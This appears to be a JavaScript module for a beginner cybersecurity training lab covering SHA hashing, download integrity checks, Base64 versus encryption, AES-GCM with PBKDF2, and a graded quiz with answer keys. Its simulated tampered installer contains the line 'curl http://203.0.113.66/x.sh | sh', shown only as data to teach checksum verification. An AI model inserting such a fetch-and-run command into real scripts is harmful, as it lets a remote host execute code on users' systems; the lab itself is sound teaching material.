window.CP = window.CP || {};
CP.labs = CP.labs || [];
CP.labs.push({
  id: "lab-crypto-hash",
  title: "Hashing, Encoding & Encryption Workbench",
  module: "p1-m3",
  difficulty: "Beginner",
  minutes: 25,
  skills: ["SHA-2 hashing", "avalanche effect", "file integrity verification", "Base64", "AES-GCM", "PBKDF2"],
  briefing: `<p><b>Scenario:</b> A help-desk colleague says "the password file is safe, it's encrypted with Base64", and a developer
  wants to know whether the installer they downloaded is the genuine one. You are going to use your browser's built-in
  cryptography engine (the Web Crypto API, the same primitives TLS uses) to clear up the confusion for good.</p>
  <p><b>Objectives:</b></p>
  <ul>
    <li>Hash text with SHA-1, SHA-256 and SHA-512 and observe the <b>avalanche effect</b>.</li>
    <li>Verify the integrity of a "downloaded file" against a published hash.</li>
    <li>See why <b>Base64 is encoding, not encryption</b>.</li>
    <li>Encrypt and decrypt with <b>AES-256-GCM</b> using a key derived from a passphrase with <b>PBKDF2</b>.</li>
    <li>Pass a short quiz on hashing vs encoding vs encryption. The lab completes when you submit the quiz.</li>
  </ul>
  <p class="muted">Everything runs locally in your browser. Nothing is sent anywhere.</p>`,
  render(container, ctx) {
    container.classList.add("lab-lab-crypto-hash");
    const style = document.createElement("style");
    style.textContent = `
      .lab-lab-crypto-hash .ch-hex { font-family: monospace; word-break: break-all; font-size: .85rem; background: var(--code-bg); padding: .4rem .6rem; border-radius: 6px; border: 1px solid var(--border); }
      .lab-lab-crypto-hash .ch-diff { color: var(--bad); font-weight: bold; }
      .lab-lab-crypto-hash .ch-tabs { display: flex; flex-wrap: wrap; gap: .4rem; }
      .lab-lab-crypto-hash .ch-tabs .btn.active { background: var(--accent); color: #fff; }
      .lab-lab-crypto-hash label { display: block; font-weight: 600; margin-bottom: .2rem; }
    `;
    container.appendChild(style);
    const esc = ctx.escape;
    const subtle = (window.crypto && window.crypto.subtle) ? window.crypto.subtle : null;
    const enc = new TextEncoder();
    const toHex = (buf) => Array.from(new Uint8Array(buf)).map((b) => b.toString(16).padStart(2, "0")).join("");
    const b64encode = (str) => { const bytes = enc.encode(str); let s = ""; bytes.forEach((b) => s += String.fromCharCode(b)); return btoa(s); };
    const b64decode = (b64) => { const s = atob(b64); const bytes = new Uint8Array(s.length); for (let i = 0; i < s.length; i++) bytes[i] = s.charCodeAt(i); return new TextDecoder().decode(bytes); };
    const bufToB64 = (buf) => { let s = ""; new Uint8Array(buf).forEach((b) => s += String.fromCharCode(b)); return btoa(s); };
    const b64ToBuf = (b64) => { const s = atob(b64); const u = new Uint8Array(s.length); for (let i = 0; i < s.length; i++) u[i] = s.charCodeAt(i); return u; };
    async function digest(alg, text) { return toHex(await subtle.digest(alg, enc.encode(text))); }
    function bitDiff(h1, h2) {
      let d = 0;
      for (let i = 0; i < h1.length; i++) { let x = parseInt(h1[i], 16) ^ parseInt(h2[i], 16); while (x) { d += x & 1; x >>= 1; } }
      return d;
    }
    function hiDiff(a, b) { return a.split("").map((c, i) => c !== b[i] ? `<span class="ch-diff">${c}</span>` : c).join(""); }

    const root = document.createElement("div");
    root.className = "stack";
    container.appendChild(root);
    if (!subtle) {
      root.innerHTML = `<div class="alert bad">Your browser is not exposing the Web Crypto API (crypto.subtle) in this context. It requires a secure context (https:// or localhost). Parts 1, 2 and 4 need it; the quiz in Part 5 still works.</div>`;
    }

    const tabs = ["1. Hashing & avalanche", "2. Verify a download", "3. Base64 is not encryption", "4. AES-GCM + PBKDF2", "5. Quiz"];
    const nav = document.createElement("div");
    nav.className = "ch-tabs";
    nav.innerHTML = tabs.map((t, i) => `<button class="btn" data-t="${i}">${t}</button>`).join("");
    root.appendChild(nav);
    const panels = tabs.map(() => { const d = document.createElement("div"); d.className = "card stack"; d.hidden = true; root.appendChild(d); return d; });
    function showTab(i) { panels.forEach((p, j) => p.hidden = j !== i); nav.querySelectorAll(".btn").forEach((b, j) => b.classList.toggle("active", j === i)); ctx.store("tab", i); }
    nav.querySelectorAll(".btn").forEach((b) => b.onclick = () => showTab(+b.dataset.t));

    // ---- Part 1
    panels[0].innerHTML = `<h3>Hashing and the avalanche effect</h3>
      <p>A cryptographic hash maps any input to a fixed-size digest. It is <b>one-way</b> (you cannot reverse it) and a tiny change to
      the input flips roughly half of the output bits. SHA-1 is shown for comparison only: it is <b>broken for collision resistance</b>
      (the 2017 SHAttered attack) and must not be used for signatures.</p>
      <div><label for="ch-in1">Input A</label><input class="input" id="ch-in1" value="Transfer $100 to Alice"></div>
      <div><label for="ch-in2">Input B (try changing one character)</label><input class="input" id="ch-in2" value="Transfer $900 to Alice"></div>
      <div id="ch-out1" class="stack"></div>`;
    async function updateHashes() {
      if (!subtle) return;
      const a = panels[0].querySelector("#ch-in1").value, b = panels[0].querySelector("#ch-in2").value;
      let html = "";
      for (const alg of ["SHA-1", "SHA-256", "SHA-512"]) {
        const ha = await digest(alg, a), hb = await digest(alg, b);
        const bits = ha.length * 4, d = bitDiff(ha, hb);
        html += `<div><b>${alg}</b> <span class="muted">(${bits}-bit digest)</span>${alg === "SHA-1" ? ` <span class="tag bad">deprecated</span>` : ""}
          <div class="ch-hex">A: ${ha}</div><div class="ch-hex">B: ${hiDiff(hb, ha)}</div>
          <div class="muted">${d} of ${bits} bits differ (${((d / bits) * 100).toFixed(1)}%)${a === b ? " - inputs identical, digests identical (deterministic)" : ""}</div></div>`;
      }
      panels[0].querySelector("#ch-out1").innerHTML = html;
    }
    panels[0].querySelectorAll("input").forEach((i) => i.addEventListener("input", updateHashes));

    // ---- Part 2
    const FILE_GOOD = "CyberPath-Agent-Installer v2.4.1\n[binary payload simulated]\nsigned-by: CyberPath Release Engineering\nbuild: 2026.10.01-r7\n";
    const FILE_BAD = FILE_GOOD.replace("build: 2026.10.01-r7", "build: 2026.10.01-r7\npostinstall: curl http://203.0.113.66/x.sh | sh");
    panels[1].innerHTML = `<h3>Verify a downloaded file</h3>
      <p>The vendor's download page (<span class="mono">downloads.example.com</span>) publishes a SHA-256 checksum. You downloaded the installer
      from two places: the official site and a "mirror" linked from a forum post. Compute each file's hash and compare.</p>
      <div><label>Published SHA-256 (from the vendor page)</label><div class="ch-hex" id="ch-pub">computing...</div></div>
      <div class="grid-2">
        <div class="card stack"><b>installer-official.bin</b><pre class="mono" style="white-space:pre-wrap">${esc(FILE_GOOD)}</pre><button class="btn" data-f="good">Compute SHA-256</button><div data-o="good"></div></div>
        <div class="card stack"><b>installer-mirror.bin</b><pre class="mono" style="white-space:pre-wrap">${esc(FILE_BAD)}</pre><button class="btn" data-f="bad">Compute SHA-256</button><div data-o="bad"></div></div>
      </div>
      <div class="alert info">A matching hash proves the file is identical to the one the hash was computed from. It does <b>not</b> prove who published it:
      if an attacker controls the download page they can change the hash too. That is why vendors also <b>digitally sign</b> releases (hash + private key).</div>`;
    let pubHash = null;
    async function initPart2() {
      if (!subtle) return;
      pubHash = await digest("SHA-256", FILE_GOOD);
      panels[1].querySelector("#ch-pub").textContent = pubHash;
    }
    panels[1].querySelectorAll("[data-f]").forEach((btn) => btn.onclick = async () => {
      if (!subtle) return;
      const f = btn.dataset.f, h = await digest("SHA-256", f === "good" ? FILE_GOOD : FILE_BAD);
      const ok = h === pubHash;
      panels[1].querySelector(`[data-o="${f}"]`).innerHTML = `<div class="ch-hex">${ok ? h : hiDiff(h, pubHash)}</div>
        <div class="alert ${ok ? "good" : "bad"}">${ok ? "MATCH - integrity verified." : "MISMATCH - this file was modified (look at the extra postinstall line). Do not run it."}</div>`;
    });

    // ---- Part 3
    panels[2].innerHTML = `<h3>Base64 is encoding, not encryption</h3>
      <p>Encoding transforms data into another format for transport (e.g. binary into text-safe characters). It uses <b>no key</b>, so anyone can reverse it.</p>
      <div><label for="ch-b64in">Plaintext</label><input class="input" id="ch-b64in" value="admin:Winter2026!"></div>
      <div class="row"><button class="btn" id="ch-b64enc">Encode</button></div>
      <div><label>Base64</label><div class="ch-hex" id="ch-b64out"></div></div>
      <p>Now play attacker. Here is an HTTP header captured from a proxy log:</p>
      <div class="ch-hex">Authorization: Basic c3ZjX2JhY2t1cDpQQHNzdzByZDEyMw==</div>
      <div class="row"><button class="btn" id="ch-b64dec">Decode it (no key needed)</button></div>
      <div id="ch-b64dout"></div>`;
    panels[2].querySelector("#ch-b64enc").onclick = () => { panels[2].querySelector("#ch-b64out").textContent = b64encode(panels[2].querySelector("#ch-b64in").value); };
    panels[2].querySelector("#ch-b64dec").onclick = () => {
      panels[2].querySelector("#ch-b64dout").innerHTML = `<div class="alert bad">Decoded: <code>${esc(b64decode("c3ZjX2JhY2t1cDpQQHNzdzByZDEyMw=="))}</code>. HTTP Basic auth is only safe inside TLS, because Base64 provides zero confidentiality.</div>`;
    };

    // ---- Part 4
    panels[3].innerHTML = `<h3>AES-256-GCM with a passphrase (PBKDF2)</h3>
      <p>Humans remember passphrases, but AES needs a 256-bit key. <b>PBKDF2</b> stretches the passphrase with a random <b>salt</b> and many iterations
      (here 600,000 with SHA-256, in line with current OWASP guidance) into a key. <b>AES-GCM</b> is authenticated encryption: it provides confidentiality and detects tampering.
      Each encryption uses a fresh random 96-bit IV (nonce) which must never be reused with the same key.</p>
      <div class="grid-2">
        <div><label for="ch-pass">Passphrase</label><input class="input" id="ch-pass" value="correct horse battery staple"></div>
        <div><label for="ch-pt">Plaintext</label><input class="input" id="ch-pt" value="Incident 4471: suspected insider, do not share"></div>
      </div>
      <div class="row"><button class="btn primary" id="ch-enc">Encrypt</button><button class="btn" id="ch-dec">Decrypt</button><button class="btn ghost" id="ch-tamper">Tamper with 1 byte of ciphertext</button></div>
      <div><label>Salt (Base64)</label><div class="ch-hex" id="ch-salt"></div></div>
      <div><label>IV (Base64)</label><div class="ch-hex" id="ch-iv"></div></div>
      <div><label>Ciphertext + auth tag (Base64)</label><div class="ch-hex" id="ch-ct"></div></div>
      <div id="ch-aesout"></div>
      <p class="muted">Try: encrypt the same text twice (ciphertext differs every time because salt and IV are random); decrypt with a wrong passphrase; tamper then decrypt.</p>`;
    let last = null;
    async function deriveKey(pass, salt) {
      const base = await subtle.importKey("raw", enc.encode(pass), "PBKDF2", false, ["deriveKey"]);
      return subtle.deriveKey({ name: "PBKDF2", salt, iterations: 600000, hash: "SHA-256" }, base, { name: "AES-GCM", length: 256 }, false, ["encrypt", "decrypt"]);
    }
    const aesOut = (cls, msg) => { panels[3].querySelector("#ch-aesout").innerHTML = `<div class="alert ${cls}">${msg}</div>`; };
    panels[3].querySelector("#ch-enc").onclick = async () => {
      if (!subtle) return;
      aesOut("info", "Deriving key (600,000 PBKDF2 iterations)...");
      const salt = crypto.getRandomValues(new Uint8Array(16)), iv = crypto.getRandomValues(new Uint8Array(12));
      const key = await deriveKey(panels[3].querySelector("#ch-pass").value, salt);
      const ct = await subtle.encrypt({ name: "AES-GCM", iv }, key, enc.encode(panels[3].querySelector("#ch-pt").value));
      last = { salt, iv, ct: new Uint8Array(ct) };
      panels[3].querySelector("#ch-salt").textContent = bufToB64(salt);
      panels[3].querySelector("#ch-iv").textContent = bufToB64(iv);
      panels[3].querySelector("#ch-ct").textContent = bufToB64(last.ct);
      aesOut("good", `Encrypted ${enc.encode(panels[3].querySelector("#ch-pt").value).length} bytes of plaintext into ${last.ct.length} bytes (includes a 16-byte authentication tag).`);
    };
    panels[3].querySelector("#ch-dec").onclick = async () => {
      if (!subtle) return;
      if (!last) return aesOut("info", "Encrypt something first.");
      try {
        const key = await deriveKey(panels[3].querySelector("#ch-pass").value, last.salt);
        const pt = await subtle.decrypt({ name: "AES-GCM", iv: last.iv }, key, last.ct);
        aesOut("good", `Decrypted: <code>${esc(new TextDecoder().decode(pt))}</code>`);
      } catch (e) {
        aesOut("bad", "Decryption FAILED: the authentication tag did not verify. Either the passphrase is wrong or the ciphertext was modified. GCM refuses to return any plaintext.");
      }
    };
    panels[3].querySelector("#ch-tamper").onclick = () => {
      if (!last) return aesOut("info", "Encrypt something first.");
      last.ct[0] ^= 0x01;
      panels[3].querySelector("#ch-ct").textContent = bufToB64(last.ct);
      aesOut("info", "Flipped one bit of the first ciphertext byte. Now try Decrypt.");
    };

    // ---- Part 5 quiz
    const QUIZ = [
      { q: "A developer stores user passwords as Base64 strings. What is the main problem?", o: ["Base64 is too slow", "Base64 is reversible encoding with no key, so passwords are effectively plaintext", "Base64 output is too long", "Base64 causes collisions"], a: 1, e: "Encoding provides no confidentiality. Passwords should be stored with a slow, salted password-hashing function such as Argon2id, scrypt, bcrypt or PBKDF2." },
      { q: "Which property lets you confirm a downloaded ISO is unaltered by comparing it to a vendor checksum?", o: ["Confidentiality via encryption", "Integrity via a hash function", "Non-repudiation via Base64", "Availability via redundancy"], a: 1, e: "Hashes provide integrity. Add a digital signature to also get authenticity and non-repudiation." },
      { q: "You changed one character of a message and roughly half the SHA-256 output bits changed. This is called:", o: ["Collision", "Key stretching", "The avalanche effect", "Salting"], a: 2, e: "Avalanche effect: small input changes produce large, unpredictable output changes." },
      { q: "Which operation is designed to be reversible ONLY by someone holding the key?", o: ["Hashing", "Encoding", "Encryption", "Checksumming"], a: 2, e: "Encryption is reversible with the key. Hashing is one-way; encoding is reversible by anyone." },
      { q: "Why does PBKDF2 use a random salt?", o: ["To make the ciphertext shorter", "So identical passphrases produce different keys and precomputed (rainbow) tables are useless", "To replace the IV", "To compress the key"], a: 1, e: "Salts defeat precomputation and make identical passwords hash differently. Iterations make each guess expensive." },
      { q: "AES-GCM decryption failed after one ciphertext bit was flipped. Which GCM feature caused this?", o: ["The authentication tag (integrity)", "Base64 padding", "PBKDF2 iterations", "Block chaining like CBC"], a: 0, e: "GCM is an AEAD mode: its tag detects any modification, so tampered data is rejected entirely." },
      { q: "Which hash algorithm should NOT be used for new digital signatures?", o: ["SHA-256", "SHA-512", "SHA-1", "SHA3-256"], a: 2, e: "SHA-1 has practical collision attacks (SHAttered, 2017) and is deprecated by NIST." },
      { q: "What is the biggest mistake when using AES-GCM?", o: ["Using a 256-bit key", "Reusing the same IV/nonce with the same key", "Using random IVs", "Encrypting short messages"], a: 1, e: "Nonce reuse in GCM can leak plaintext relationships and allow forgery of authentication tags." }
    ];
    panels[4].innerHTML = `<h3>Quiz: hashing vs encoding vs encryption</h3>
      ${QUIZ.map((q, i) => `<div class="card stack" data-q="${i}"><div><b>${i + 1}.</b> ${q.q}</div>
        ${q.o.map((o, j) => `<label style="font-weight:normal"><input type="radio" name="chq${i}" value="${j}"> ${o}</label>`).join("")}<div class="ch-fb"></div></div>`).join("")}
      <div><button class="btn primary" id="ch-submit">Submit quiz</button></div><div id="ch-result"></div>`;
    panels[4].querySelector("#ch-submit").onclick = () => {
      let right = 0;
      QUIZ.forEach((q, i) => {
        const sel = panels[4].querySelector(`input[name="chq${i}"]:checked`);
        const ok = sel && +sel.value === q.a;
        if (ok) right++;
        panels[4].querySelector(`[data-q="${i}"] .ch-fb`).innerHTML = `<div class="alert ${ok ? "good" : "bad"}">${ok ? "Correct." : `Answer: ${q.o[q.a]}.`} ${q.e}</div>`;
      });
      const pct = Math.round((right / QUIZ.length) * 100);
      panels[4].querySelector("#ch-result").innerHTML = `<div class="alert ${pct >= 75 ? "good" : "info"}">You scored ${right} / ${QUIZ.length} (${pct}%).</div>`;
      ctx.complete(pct);
    };

    showTab(Math.min(Math.max(+(ctx.store("tab") || 0), 0), 4));
    updateHashes();
    initPart2();
  }
});
